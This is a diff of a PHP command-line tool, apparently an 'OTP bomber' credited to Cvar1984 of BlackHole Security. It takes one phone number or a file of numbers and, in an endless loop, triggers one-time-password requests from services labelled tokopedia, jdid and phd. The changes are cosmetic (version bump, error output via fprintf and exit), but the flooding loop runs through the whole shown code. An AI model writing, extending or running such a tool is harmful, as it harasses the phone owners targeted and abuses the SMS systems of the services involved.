@@ -26,26 +26,29 @@ if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
 
 echo $Y.
 '
- _     _ _        ___ _____ ____  
-| |   (_) |_ ___ / _ \_   _|  _ \ 
+ _     _ _        ___ _____ ____
+| |   (_) |_ ___ / _ \_   _|  _ \
 | |   | | __/ _ \ | | || | | |_) |
-| |___| | ||  __/ |_| || | |  __/ 
+| |___| | ||  __/ |_| || | |  __/
 |_____|_|\__\___|\___/ |_| |_|';
 echo $R."\n".'++++++++++++++++++++++++++++++++++++++';
 echo $B."\n".'Author  : Cvar1984                   '.$R.'+';
 echo $B."\n".'Github  : https://github.com/Cvar1984'.$R.'+';
 echo $B."\n".'Team    : BlackHole Security         '.$R.'+';
-echo $B."\n".'Version : 2.4                        '.$R.'+';
+echo $B."\n".'Version : 2.5                        '.$R.'+';
 echo $B."\n".'Date    : 13-03-2018                 '.$R.'+';
 echo $R."\n".'++++++++++++++++++++++++++++++++++++++'.$G.$X."\n";
-isset($argv[1]) OR die($RR.'[!] Input No List [!]'.$X);
+if(!isset($argv[1])) {
+	fprintf(STDERR,$RR.'[!] Input No List [!]'.$X);
+	exit(-1);
+}
 $bom=new otp();
 if(is_numeric($argv[1])) {
 	ob_start();
 	echo $bom->otp($argv[1],'tokopedia');
 	ob_get_clean();
 	while(1) {
-		echo $G.'Send OTP to '.$Y.'['.$argv[1].']'.$X;
+		fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1].']'.$X);
 		ob_start();
 		echo $bom->otp($argv[1],'jdid');
 		echo $bom->otp($argv[1],'phd');
@@ -58,10 +61,10 @@ if(is_numeric($argv[1])) {
 			$argv[1]=str_replace(' ','',$argv[1]);
 			$argv[1]=explode("\n",$argv[1]);
 			$count=sizeof($argv[1]);
-			
+
 			while(1) {
 				for($x=0;$x<$count;$x++) {
-					echo $G.'Send OTP to '.$Y.'['.$argv[1][$x].']'.$X;
+					fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1][$x].']'.$X);
 					ob_start();
 					echo $bom->otp($argv[1][$x],'tokopedia');
 					echo $bom->otp($argv[1][$x],'jdid');
@@ -70,5 +73,6 @@ if(is_numeric($argv[1])) {
 				}
 			}
 		}
-		die($RR.'File not exist'.$X);
+		fprintf(STDERR,$RR.'File not exist'.$X);
+		exit(-1);
 	}
